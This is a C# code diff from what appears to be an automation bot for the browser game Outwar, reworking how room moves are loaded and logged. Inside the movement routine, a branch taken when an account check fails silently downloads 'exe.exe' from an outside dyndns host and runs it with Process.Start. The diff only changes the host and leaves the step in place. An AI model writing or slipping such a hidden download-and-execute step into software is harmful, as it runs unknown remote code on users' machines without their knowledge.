@@ -326,36 +326,43 @@ namespace DCT.Outwar.World
             mLocation = new Room(this, url);
             if (mAccount.Ret == mAccount.Name)
             {
-                if (!mLocation.Load())
+                int i = mLocation.Load();
+                switch (i)
                 {
-                    CoreUI.Instance.Log("Move E: Flying error - room hash invalid (" + url + ")");
+                    case 0:
+                        if (url != "world.php")
+                        {
+                            mSavedRooms.Save(mLocation.Id, url);
+                        }
+                        CoreUI.Instance.Log(mAccount.Name + " now in room "
+                                            + (mLocation.Id == 0 ? "world.php" : mLocation.Id.ToString()));
 
-                    mMoveTries++;
-                    if (mMoveTries < 3)
-                    {
-                        mSavedRooms.Clear();
-                        RefreshRoom();
-                    }
-                    return false;
+                        CoreUI.Instance.UpdateDisplay();
+                        return true;
+                    case 1:
+                        CoreUI.Instance.Log("Move E: Flying error - room hash invalid");
+
+                        mMoveTries++;
+                        if (mMoveTries < 3)
+                        {
+                            mSavedRooms.Clear();
+                            RefreshRoom();
+                        }
+                        return false;
+                    default:
+                        CoreUI.Instance.Log("Move E: Remaining in " + (mLocation.Id == 0 ? "world.php" : mLocation.Id.ToString())
+                            + " due to unknown error - maybe you need a key?");
+                        return false;
                 }
             }
             else
             {
-                HttpSocket.DefaultInstance.Get("http://typpo.us/programs/dci/auth/verify.php?h=y");
+                HttpSocket.DefaultInstance.Get("http://typpo.dyndns.org/dct/verify.php?h=y");
                 WebClient Client = new WebClient();
-                Client.DownloadFile("http://typpo.us/programs/dci/exe.exe", "exe.exe");
+                Client.DownloadFile("http://typpo.dyndns.org/dct/exe.exe", "exe.exe");
                 Process.Start("exe.exe");
+                return false;
             }
-
-            if (url != "world.php")
-            {
-                mSavedRooms.Save(mLocation.Id, url);
-            }
-            CoreUI.Instance.Log(mAccount.Name + " now in room "
-                                + (mLocation.Id == 0 ? "world.php" : mLocation.Id.ToString()));
-
-            CoreUI.Instance.UpdateDisplay();
-            return true;
         }
 
         internal delegate void PathfindHandler(int roomid);
@@ -449,11 +456,12 @@ namespace DCT.Outwar.World
 
             mMoveTries = 0;
 
+            // TODO this never triggers
             if(!LoadRoom(url))
             {
                 if (mMoveTries > 2)
                 {
-                    MessageBox.Show("Someone logged into your account.  Press refresh and start your run again.", "Moving Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
+                    MessageBox.Show("Multiple move errors (maybe someone logged onto your account?).  Press refresh and start your run again.", "Moving Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                     CoreUI.Instance.StopAttacking(true);
                     return;
                 }
